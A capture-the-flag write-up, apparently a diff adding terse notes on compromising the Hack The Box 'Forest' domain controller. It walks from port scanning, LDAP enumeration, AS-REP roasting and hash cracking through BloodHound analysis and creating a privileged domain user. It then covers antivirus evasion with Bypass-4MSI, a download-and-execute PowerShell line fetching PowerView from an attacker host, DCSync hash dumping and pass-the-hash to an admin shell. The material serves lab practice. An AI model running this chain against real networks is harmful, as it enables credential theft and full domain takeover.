@@ -1,0 +1,37 @@
+//HTB Minatos writeup of Forest
+
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -sC -sV -p$ports 10.10.10.161
+ldap -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"	//-x anonymous authentication. -b is basedn to start from, -U to enumerate all users
+python windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U	//to query domain
+python windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"	//enumerate all other objects
+GetNPUsers.py htb.loca/svc-alfresco -dc-ip 10.10.10.161 -no-pass	//from impacket to request a TGT ticket and dump the hash
+john hash.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
+ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice	//check login with winrm. Got user svc-alfresco's shell
+
+//PrivEsc
+pip install bloodhound
+neo4j console	//need this to start bloodhound
+bloodhound-python -d htb.local -usvc-alfresco -p s3rvice	//dumps json files with users,domains,etc
+./BloodHound --no-sandbox	//drag and drop json files, search for svc-alfresco, mark it as owned and queries/Shortest Path from Owned Principals/HTB.LOCAL, get graph. 
+//Members of the Account Operators group are allowed create and modify users and add them to non-protected groups
+//Exchange Windows Permissions group has WriteDacl privileges on the Domain, WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them DCSync privileges.
+//Go back to the WinRM shell and add a new user to Exchange Windows Permissions as well as
+the Remote Management Users group.
+net user charles password /add /domain
+net group "Exchange Windows Permissions" charles /add
+net localgroup "Remote Management Users" charles /add
+
+//Donwload PowerView.ps1
+python -m SimpleHTTPServer
+
+menu		//win
+Bypass-4MSI	//to evade defender for the script
+iex(new-object net.webclient).downloadString('http://10.10.x.x:xxxx/PowerView.ps1')
+$pass = convertto-securestring 'password' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\charles', $pass)
+Add-ObjectACL -PrincipalIdentity charles -Credential $cred -Rights DCSync	//give charles DCSync rights
+
+secretsdump.py htb/charlesbbc@10.10.10.161	//linux, from impacket, run as charles, used to reveal NTLM hashes
+secretsdump.py htb.local/charles:password@10.10.10.161	//if the one before doesn't work
+psexec.py administrator@10.10.10.161 -hashes <hash:hash>	//got shell as Admin
